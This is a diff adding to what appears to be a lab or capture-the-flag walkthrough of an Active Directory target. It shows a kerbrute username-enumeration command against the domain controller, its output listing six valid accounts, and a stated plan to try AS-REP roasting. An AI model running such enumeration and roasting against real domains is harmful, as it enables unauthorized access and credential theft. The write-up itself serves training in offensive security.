@@ -232,5 +232,32 @@ So i found some team members before ill put them into a file calles `names.txt`
 Then ill run username anarchy to generate some different combinations, even though im pretty sure itll be first.last initial like i saw with `mitch.r` 
 
 ```python
+kerbrute userenum --dc sg-dc01.shadowgate.local -d shadowgate.local ../potential-users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 07/31/26 - Ronnie Flathers @ropnop
+
+2026/07/31 17:47:02 >  Using KDC(s):
+2026/07/31 17:47:02 >  	sg-dc01.shadowgate.local:88
+
+2026/07/31 17:47:02 >  [+] VALID USERNAME:	mitch.r@shadowgate.local
+2026/07/31 17:47:03 >  [+] VALID USERNAME:	bogdan.r@shadowgate.local
+2026/07/31 17:47:03 >  [+] VALID USERNAME:	milo.w@shadowgate.local
+2026/07/31 17:47:03 >  [+] VALID USERNAME:	oscar.m@shadowgate.local
+2026/07/31 17:47:03 >  [+] VALID USERNAME:	daniel.r@shadowgate.local
+2026/07/31 17:47:03 >  [+] VALID USERNAME:	ryan.j@shadowgate.local
+2026/07/31 17:47:03 >  Done! Tested 109 usernames (6 valid) in 1.074 seconds
+```
+
+Found 6 valid users, no sam but it does say on the page he has left so he may be deleted, that could come in later to restore the user!
+
+Using this list i can try some AS-REP roasting
+
+```python
 
 ```
